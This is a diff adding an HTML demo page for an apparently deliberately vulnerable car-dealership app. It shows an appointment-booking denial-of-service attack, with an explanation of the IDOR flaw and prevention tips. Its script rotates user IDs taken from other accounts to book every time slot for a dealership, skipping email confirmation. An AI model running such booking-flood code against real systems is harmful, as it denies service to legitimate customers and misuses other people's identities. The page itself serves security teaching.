@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AutoFinder - Appointment DOS Attack Demo</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #1e1e2e;
+      color: #cdd6f4;
+    }
+    .navbar {
+      background-color: #181825 !important;
+      border-bottom: 1px solid #313244;
+    }
+    .card {
+      background-color: #181825;
+      border: 1px solid #313244;
+    }
+    .card-header {
+      background-color: #11111b;
+      border-bottom: 1px solid #313244;
+    }
+    .form-control, .form-select {
+      background-color: #1e1e2e;
+      border: 1px solid #313244;
+      color: #cdd6f4;
+    }
+    .form-control:focus, .form-select:focus {
+      background-color: #1e1e2e;
+      border-color: #89b4fa;
+      color: #cdd6f4;
+      box-shadow: 0 0 0 0.25rem rgba(137, 180, 250, 0.25);
+    }
+    .alert-danger {
+      background-color: #f38ba8;
+      border-color: #f38ba8;
+      color: #11111b;
+    }
+    .alert-warning {
+      background-color: #f9e2af;
+      border-color: #f9e2af;
+      color: #11111b;
+    }
+    .alert-info {
+      background-color: #89b4fa;
+      border-color: #89b4fa;
+      color: #11111b;
+    }
+    .table-dark {
+      --bs-table-bg: #181825;
+      --bs-table-border-color: #313244;
+    }
+    .vulnerability-badge {
+      background-color: #f38ba8;
+      color: #11111b;
+      font-size: 0.75rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 3px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+    .spin {
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark">
+    <div class="container">
+      <a class="navbar-brand" href="/demo1">
+        <i class="bi bi-shield-exclamation me-2"></i>AutoFinder DOS Attack Demo
+      </a>
+      <div class="navbar-nav ms-auto">
+        <a class="nav-link" href="/demo1/docs">📋 Documentation</a>
+        <a class="nav-link" href="/demo1">🚗 AutoFinder</a>
+        <a class="nav-link" href="/">← Back to Demos</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container mt-4">
+    <div class="row justify-content-center">
+      <div class="col-md-8">
+        
+        <!-- Warning Notice -->
+        <div class="alert alert-danger">
+          <h5 class="mb-2">
+            <i class="bi bi-exclamation-triangle me-2"></i>Security Vulnerability Demonstration
+            <span class="vulnerability-badge ms-2">CRITICAL</span>
+          </h5>
+          <p class="mb-0">This page demonstrates the appointment booking DOS (Denial of Service) attack described in the AutoFinder security documentation. This attack can completely shut down a dealership's appointment system by monopolizing all available time slots.</p>
+        </div>
+
+        <!-- DOS Attack Interface -->
+        <div class="card">
+          <div class="card-header">
+            <h5 class="mb-0">
+              <i class="bi bi-calendar-x me-2"></i>Appointment DOS Attack Demonstration
+            </h5>
+          </div>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="mb-3">
+                  <label for="dealerId" class="form-label">Target Dealership ID</label>
+                  <input type="text" class="form-control" id="dealerId" value="6017" placeholder="e.g., 6017">
+                  <div class="form-text">Dealership 6017 from documentation examples</div>
+                </div>
+                <div class="mb-3">
+                  <label for="appointmentDate" class="form-label">Target Date</label>
+                  <input type="date" class="form-control" id="appointmentDate" value="2023-02-07">
+                  <div class="form-text">Date to monopolize all appointment slots</div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="alert alert-info">
+                  <h6><i class="bi bi-info-circle me-2"></i>Attack Details</h6>
+                  <ul class="mb-0 small">
+                    <li><strong>Time Slots:</strong> 18 slots (9:00 AM - 5:30 PM, 30-min intervals)</li>
+                    <li><strong>User IDs:</strong> Real user IDs stolen from IDOR attacks</li>
+                    <li><strong>Impact:</strong> Complete appointment system shutdown</li>
+                    <li><strong>Method:</strong> Exploits missing authorization checks</li>
+                  </ul>
+                </div>
+                <div class="alert alert-warning">
+                  <small><strong>Vulnerability Explanation:</strong> This demonstrates the appointment DOS vulnerability. The system doesn't verify that you own the User ID you're booking for, allowing attackers to book appointments using stolen user identities.</small>
+                </div>
+                <div class="alert alert-info">
+                  <small><strong>Educational Purpose:</strong> This demonstration shows how appointment systems can be vulnerable to DOS attacks when proper authorization is missing.</small>
+                </div>
+              </div>
+            </div>
+            
+            <div class="d-grid">
+              <button type="button" class="btn btn-danger btn-lg" onclick="demonstrateDosAttack()">
+                <i class="bi bi-exclamation-triangle me-2"></i>Execute DOS Attack
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Attack Results -->
+        <div id="attackResults" class="mt-4" style="display: none;">
+          <div class="card">
+            <div class="card-header">
+              <h5 class="mb-0">
+                <i class="bi bi-clipboard-data me-2"></i>Attack Results
+              </h5>
+            </div>
+            <div class="card-body">
+              <div id="attackContent"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Attack Explanation -->
+        <div class="card mt-4">
+          <div class="card-header">
+            <h5 class="mb-0">
+              <i class="bi bi-book me-2"></i>How This Attack Works
+            </h5>
+          </div>
+          <div class="card-body">
+            <ol>
+              <li><strong>User ID Collection:</strong> Attacker collects multiple user UUIDs using IDOR vulnerabilities</li>
+              <li><strong>Authorization Bypass:</strong> System doesn't verify that the requester owns the user ID</li>
+              <li><strong>Slot Monopolization:</strong> Different user IDs are rotated to book every available time slot</li>
+              <li><strong>Service Denial:</strong> Legitimate customers cannot book appointments</li>
+              <li><strong>Business Impact:</strong> Lost revenue, customer frustration, reputation damage</li>
+            </ol>
+            
+            <div class="alert alert-info mt-3">
+              <h6><i class="bi bi-lightbulb me-2"></i>Prevention Methods</h6>
+              <ul class="mb-0">
+                <li>Implement proper user authentication and authorization</li>
+                <li>Add rate limiting per IP address and user account</li>
+                <li>Require CAPTCHA verification for appointment booking</li>
+                <li>Implement appointment confirmation via email/SMS</li>
+                <li>Monitor for suspicious booking patterns</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    async function demonstrateDosAttack() {
+      const dealerId = document.getElementById('dealerId').value;
+      const appointmentDate = document.getElementById('appointmentDate').value;
+      
+      if (!dealerId || !appointmentDate) {
+        alert('Please provide dealership ID and appointment date.');
+        return;
+      }
+      
+      // Show initial loading state
+      showAttackResult(`
+        <div class="alert alert-info">
+          <h6><i class="bi bi-arrow-clockwise spin me-2"></i>Preparing DOS Attack</h6>
+          <p>Fetching valid user IDs from the system...</p>
+        </div>
+      `);
+      
+      // Fetch real user IDs from the system for the attack
+      let realUserIds;
+      try {
+        const userResponse = await fetch('/demo1/api/demo-user-ids');
+        const userData = await userResponse.json();
+        realUserIds = userData.userIds;
+        
+        if (!realUserIds || realUserIds.length === 0) {
+          throw new Error('No user IDs available');
+        }
+      } catch (error) {
+        showAttackResult(`
+          <div class="alert alert-danger">
+            <h6><i class="bi bi-exclamation-triangle me-2"></i>Attack Preparation Failed</h6>
+            <p>Could not fetch valid user IDs from the system: ${error.message}</p>
+            <p>Make sure the application is running and users are available.</p>
+          </div>
+        `);
+        return;
+      }
+      
+      // 18 time slots (30-minute intervals from 9 AM to 5:30 PM)
+      const timeSlots = [
+        '09:00:00', '09:30:00', '10:00:00', '10:30:00',
+        '11:00:00', '11:30:00', '12:00:00', '12:30:00', 
+        '13:00:00', '13:30:00', '14:00:00', '14:30:00',
+        '15:00:00', '15:30:00', '16:00:00', '16:30:00',
+        '17:00:00', '17:30:00'
+      ];
+      
+      let results = [];
+      let successCount = 0;
+      
+      // Show attack progress with real user info
+      showAttackResult(`
+        <div class="alert alert-warning">
+          <h6><i class="bi bi-exclamation-triangle me-2"></i>Executing DOS Attack</h6>
+          <p>Attempting to monopolize all ${timeSlots.length} appointment slots using <strong>${realUserIds.length} real user IDs</strong> stolen from the system...</p>
+          <div class="progress mb-3">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%" id="dosProgress"></div>
+          </div>
+          <div id="progressStatus">Starting attack...</div>
+        </div>
+      `);
+      
+      // Execute the attack using real user IDs
+      for (let i = 0; i < timeSlots.length; i++) {
+        const time = timeSlots[i];
+        const userId = realUserIds[i % realUserIds.length]; // Rotate through real user IDs
+        
+        // Update progress status
+        document.getElementById('progressStatus').textContent = 
+          `Booking slot ${i + 1}/${timeSlots.length}: ${time} using user ${userId.substring(0, 8)}...`;
+        
+        try {
+          const response = await fetch(`/api/appointments/legacy/${dealerId}`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              appointmentTime: time,
+              appointmentDate: appointmentDate,
+              phoneNumber: '555-DOS-ATTACK',
+              originPageId: 'dos_attack_demo',
+              userId: userId,
+              skipEmailConfirmation: true
+            })
+          });
+          
+          const result = await response.json();
+          const success = result.result === 'Success';
+          
+          if (success) successCount++;
+          
+          results.push({
+            time: time,
+            userId: userId,
+            success: success,
+            error: result.error || null
+          });
+          
+          // Update progress bar
+          const progress = ((i + 1) / timeSlots.length) * 100;
+          document.getElementById('dosProgress').style.width = progress + '%';
+          
+          // Small delay to show progress and avoid overwhelming server
+          await new Promise(resolve => setTimeout(resolve, 300));
+          
+        } catch (error) {
+          results.push({
+            time: time,
+            userId: userId,
+            success: false,
+            error: 'Network error: ' + error.message
+          });
+        }
+      }
+      
+      // Show final results
+      const impactLevel = successCount === timeSlots.length ? 'COMPLETE' : 
+                         successCount > timeSlots.length * 0.7 ? 'SEVERE' : 
+                         successCount > 0 ? 'MODERATE' : 'FAILED';
+      
+      let resultHtml = `
+        <div class="alert alert-${successCount > 0 ? 'danger' : 'info'}">
+          <h5><i class="bi bi-shield-exclamation me-2"></i>DOS Attack Results</h5>
+          <div class="row">
+            <div class="col-md-6">
+              <p><strong>Attack Success Rate:</strong> ${successCount}/${timeSlots.length} slots monopolized (${Math.round((successCount/timeSlots.length)*100)}%)</p>
+              <p><strong>Impact Level:</strong> <span class="badge ${successCount > 0 ? 'bg-danger' : 'bg-secondary'}">${impactLevel}</span></p>
+            </div>
+            <div class="col-md-6">
+              <p><strong>Target:</strong> Dealership ${dealerId}</p>
+              <p><strong>Date:</strong> ${appointmentDate}</p>
+              <p><strong>User IDs Used:</strong> ${realUserIds.length} real accounts (stolen)</p>
+            </div>
+          </div>
+        </div>
+        
+        <div class="table-responsive">
+          <table class="table table-dark table-striped table-sm">
+            <thead>
+              <tr>
+                <th>Time Slot</th>
+                <th>User ID Used</th>
+                <th>Result</th>
+                <th>Impact</th>
+              </tr>
+            </thead>
+            <tbody>
+      `;
+      
+      results.forEach(result => {
+        resultHtml += `
+          <tr class="${result.success ? 'table-danger' : 'table-secondary'}">
+            <td><strong>${result.time}</strong></td>
+            <td><code>${result.userId.substring(0, 13)}...</code></td>
+            <td>
+              ${result.success ? 
+                '<span class="badge bg-danger">MONOPOLIZED</span>' : 
+                '<span class="badge bg-secondary">FAILED</span>'
+              }
+            </td>
+            <td class="small">${result.error || (result.success ? 'Slot unavailable to legitimate customers' : 'Booking attempt failed')}</td>
+          </tr>
+        `;
+      });
+      
+      resultHtml += `
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="alert alert-${successCount > 0 ? 'danger' : 'info'}">
+          <h6><i class="bi bi-exclamation-triangle me-2"></i>Business Impact Analysis</h6>
+          ${successCount > 0 ? `
+            <p><strong>CRITICAL:</strong> ${successCount} appointment slots are now monopolized by fake bookings. Legitimate customers attempting to book these slots will be denied service.</p>
+            <ul class="mb-0">
+              <li><strong>Revenue Loss:</strong> Potential appointments worth thousands of dollars blocked</li>
+              <li><strong>Customer Frustration:</strong> Legitimate customers unable to schedule appointments</li>
+              <li><strong>Operational Disruption:</strong> Staff dealing with fake bookings and customer complaints</li>
+              <li><strong>Reputation Damage:</strong> Poor customer experience affects brand reputation</li>
+            </ul>
+          ` : `
+            <p>The attack was unsuccessful. This could indicate that proper security measures are in place or the system is currently unavailable.</p>
+          `}
+        </div>
+      `;
+      
+      showAttackResult(resultHtml);
+    }
+    
+    function showAttackResult(content) {
+      document.getElementById('attackContent').innerHTML = content;
+      document.getElementById('attackResults').style.display = 'block';
+      document.getElementById('attackResults').scrollIntoView({ behavior: 'smooth' });
+    }
+  </script>
+</body>
+</html>
